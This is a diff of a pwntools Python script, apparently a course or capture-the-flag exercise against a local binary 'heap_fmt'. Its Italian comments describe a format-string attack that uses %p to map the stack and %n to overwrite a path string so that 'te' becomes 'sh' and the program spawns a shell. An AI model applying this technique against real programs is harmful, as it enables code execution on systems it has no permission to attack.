@@ -4,14 +4,14 @@ from pwn import u16
 def main():
     e = ELF('../Machines/heap_fmt')
     p = process(e.path)
-    #context.update(arch='amd64', os='linux') #È fondamentale specificare il contesto, ovvero l'architettura e il sistema operativo dell'elf
+    #context.update(arch='amd64', os='linux') #E' fondamentale specificare il contesto, ovvero l'architettura e il sistema operativo dell'elf
     #Se non si ha la sicurezza del contesto basta riferirsi a quello dell'eseguibile con: 
     context.binary = e
 
     #Creazione del payload: analizzando lo stack e gli indirizzi stampati con l'inserimento manuale di
-    # una sequenza di %p %p... Si comprende che l'indirizzo con offset pari a 6 in realtà punta ad un
-    # altro indirizzo nello stack. Verrà "sovrascitto" (tramite %n) tale indirizzo con quello dell'indirizzo del target,
-    # ovvero date_path. Inoltre, modificando i dati di tale indirizzo in realtà si staranno
+    # una sequenza di %p %p... Si comprende che l'indirizzo con offset pari a 6 in realta' punta ad un
+    # altro indirizzo nello stack. Verra' "sovrascitto" (tramite %n) tale indirizzo con quello dell'indirizzo del target,
+    # ovvero date_path. Inoltre, modificando i dati di tale indirizzo in realta' si staranno
     # cambiando i dati all'interno dell'indirizzo puntato. Viene quindi cambiato 'te' in 'sh' nell'indirizzo
     # puntato da quello con offset 6 (l'indirizzo puntato ha offset 34, analizzando lo stack con gdb)
     payload = "%c"*4
